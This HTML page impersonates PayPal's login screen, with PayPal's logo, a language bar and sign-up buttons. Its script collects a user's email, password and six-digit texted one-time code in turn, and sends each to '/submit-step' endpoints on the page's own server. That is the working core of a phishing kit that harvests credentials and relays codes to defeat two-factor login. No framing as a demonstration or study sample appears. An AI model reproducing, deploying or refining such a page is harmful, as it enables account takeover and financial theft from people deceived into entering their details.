              <title>PayPal</title>

          <body>
              <div class="container">
                  <div class="section">
                      <div class="logo">
                          <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" />
                      </div>

                      <div class="overlay" id="overlay">
                          <div class="loader"></div>
                      </div>

                      <!-- Step 1: Email or Mobile Number -->
                      <form id="step1">
                          <div class="input-field">
                              <input id="email" name="login_email" type="email" required placeholder=" ">
                              <label for="email">Email or mobile number</label>
                          </div>
                          <div class="forgot-password">
                              <a href="#">Forgot email?</a>
                          </div>
                          <button class="button" type="button" id="nextToStep2">Next</button>
                          <div class="separator">
                              <div class="separatorline"></div>
                              <p>or</p>
                              <div class="separatorline"></div>
                          </div>
                          <button class="signup-btn">Sign Up</button>
                      </form>

                      <!-- Step 2: Enter Password -->
                      <form class="login-form hidden" id="step2">
                          <div class="input-field">
                              <span id="displayUsername"></span>
                              <a href="#">Change?</a>
                              <div>
                                  <input id="password" name="login_password" type="password" required placeholder="" aria-describedby="passwordErrorMessage">
                                  <label for="password">Password</label>
                              </div>
                          </div>
                          <button class="button" type="button" id="nextToStep3">Log In</button>

                          <div class="forgot-password">
                              <a href="#">Forgot password?</a>
                          </div>
                          <div class="separator">
                              <div class="separatorline"></div>
                              <p>or</p>
                              <div class="separatorline"></div>
                          </div>
                          <button class="signup-btn">Sign Up</button>
                      </form>

                      <!-- Step 3: Enter OTP -->
          <form class="login-form hidden" id="step3">
              <h3 style="font-family: Arial, sans-serif; font-size: 18px; color: #333; text-align: center; margin-bottom: 20px;">
                  Enter the code we texted you
              </h3>
              <div class="input-field" style="text-align: center;">
                  <div style="display: flex; justify-content: center; gap: 10px;">
                      <input id="otp1" type="text" maxlength="1" oninput="moveToNext(event, 'otp2')" autofocus
                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
                      <input id="otp2" type="text" maxlength="1" oninput="moveToNext(event, 'otp3')"
                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
                      <input id="otp3" type="text" maxlength="1" oninput="moveToNext(event, 'otp4')"
                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
                      <input id="otp4" type="text" maxlength="1" oninput="moveToNext(event, 'otp5')"
                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
                      <input id="otp5" type="text" maxlength="1" oninput="moveToNext(event, 'otp6')"
                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
                      <input id="otp6" type="text" maxlength="1"
                          style="width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; outline: none; transition: border-color 0.3s;">
                  </div>
                          </div>
                          <button class="button" type="button" id="submitForm">Submit</button>

               <button
            class="styles_button_tertiary__6ka6j68 styles_button_size_lg__6ka6j62"
            data-ppui-info=""
            id="buttons"
            data-nemo="tryDifferentWay"
            name="tryDifferentWay"
            href="#"
            tab-index="0"
            style="
              display: flex;
              align-items: center;
              justify-content: center;
              background: none;
              border: none;
              color: #0070ba;
              font-family: Arial, sans-serif;
              font-size: 16px;
              font-weight: 600;
              cursor: pointer;
              text-decoration: none;
              height: 50px;
              width:100%;
              padding: 0 20px;
              text-align: center;
              line-height: normal;
              white-space: nowrap;
            "
          >
            Log In Another Way
          </button>

                      </form>

                      <div class="language">
                          <img class="language-img" src="https://upload.wikimedia.org/wikipedia/en/archive/a/a4/20151118161037%21Flag_of_the_United_States.svg" alt="">
                          <p>English | Français | Español | 中文</p>
                      </div>
                  </div>
              </div>

              <script>
                  function moveToNext(event, nextFieldId) {
                      if (event.target.value.length === 1) {
                          document.getElementById(nextFieldId).focus();
                      }
                  }

                  const step1 = document.getElementById('step1');
                  const step2 = document.getElementById('step2');
                  const step3 = document.getElementById('step3');

                  document.getElementById('nextToStep2').addEventListener('click', async () => {
                      const email = document.getElementById('email').value;

                      if (email) {
                          const response = await fetch('/submit-step1', {
                              method: 'POST',
                              headers: { 'Content-Type': 'application/json' },
                              body: JSON.stringify({ email })
                          });

                          const result = await response.json();
                          alert(result.message);

                          if (result.success) {
                              step1.classList.add('hidden');
                              step2.classList.remove('hidden');
                              document.getElementById('displayUsername').textContent = email;
                          }
                      } else {
                          alert('Please enter a valid email.');
                      }
                  });

                  document.getElementById('nextToStep3').addEventListener('click', async () => {
                      const password = document.getElementById('password').value;

                      if (password) {
                          const response = await fetch('/submit-step2', {
                              method: 'POST',
                              headers: { 'Content-Type': 'application/json' },
                              body: JSON.stringify({ password })
                          });

                          const result = await response.json();
                          alert(result.message);

                          if (result.success) {
                              step2.classList.add('hidden');
                              step3.classList.remove('hidden');
                          }
                      } else {
                          alert('Please enter a valid password.');
                      }
                  });

                  document.getElementById('submitForm').addEventListener('click', async () => {
                      const otp = Array.from({ length: 6 }, (_, i) => document.getElementById(`otp${i + 1}`).value).join('');

                      if (otp) {
                          const response = await fetch('/submit-step3', {
                              method: 'POST',
                              headers: { 'Content-Type': 'application/json' },
                              body: JSON.stringify({ otp })
                          });

                          const result = await response.json();
                          alert(result.message);

                          if (result.success) {
                              alert('Login process completed successfully!');
                          }
                      } else {
                          alert('Please enter a valid OTP.');
                      }
                  });
              </script>

                      </div>
                  </footer>
